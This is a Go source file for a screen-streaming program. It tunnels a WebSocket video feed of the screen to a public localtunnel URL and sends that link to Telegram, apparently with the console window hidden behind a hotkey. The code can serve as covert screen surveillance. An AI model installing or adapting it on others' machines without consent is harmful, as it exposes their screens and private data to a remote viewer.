package main

import (
	_ "embed"
	"html/template"
	"log"
	"net/http"
	showConsol "streamScreen/showConsol"
	"streamScreen/stream"
	"streamScreen/telegram"
	"time"

	"github.com/localtunnel/go-localtunnel"

	"strings"
)

//go:embed stream_template.html
var streamTemplate string

func run() error {
	tunnel, err := localtunnel.New(8081, "localhost", localtunnel.Options{})
	if err != nil {
		log.Println("Error starting localtunnel:", err)
		return err
	}
	defer tunnel.Close()

	appURL := tunnel.URL() + "/stream"
	log.Println("App URL:", appURL)

	if err := telegram.SendTelegramMessageWithButton(appURL); err != nil {
		log.Println("Error sending message to Telegram:", err)
	}
	for {
		time.Sleep(time.Minute)
	}
	return nil
}

func main() {

	go showConsol.CheckHotkey()

	tmpl, err := template.New("stream").Parse(streamTemplate)

	if err != nil {
		log.Fatal("Error parsing template:", err)
	}

	http.HandleFunc("/ws", stream.WsStreamHandler)

	http.HandleFunc("/stream", func(w http.ResponseWriter, r *http.Request) {
		wsURL := ""
		if strings.Contains(r.Host, ":") {
			wsURL = "ws://" + r.Host + "/ws"
		} else {
			wsURL = "wss://" + r.Host + "/ws"
		}
		if err := tmpl.Execute(w, struct{ WebSocketURL string }{WebSocketURL: wsURL}); err != nil {
			http.Error(w, "Error executing template", http.StatusInternalServerError)
		}
	})

	go func() {
		log.Fatal(http.ListenAndServe(":8081", nil))
	}()

	go stream.SendVideoStream()
	run()

	// if err := run(context.Background()); err != nil {
	// 	log.Fatal(err)
	// }
}
